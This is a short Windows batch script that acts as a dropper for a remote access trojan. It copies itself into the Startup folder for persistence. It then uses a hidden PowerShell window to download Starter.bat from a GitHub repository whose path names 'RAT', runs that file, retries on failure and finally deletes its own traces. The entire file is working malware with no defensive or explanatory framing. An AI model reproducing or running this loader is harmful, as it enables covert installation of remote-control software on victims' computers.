
@echo off
set "currentd=%cd%"
mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
set "targetd=C:\Users\%username%\AppData\Local\Temp\MicroWindows"
cd %targetd%
copy "%~f0" "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"

:LOOP
powershell powershell.exe  -windowstyle hidden "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"

if %errorlevel% equ 0 (
  start "" Starter.bat
  cd %currentd%
  del "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
  del "%~f0"
  
) else (
  ping -n 5 127.0.0.1 > nul 2>&1
  goto LOOP
  del "%~f0"
)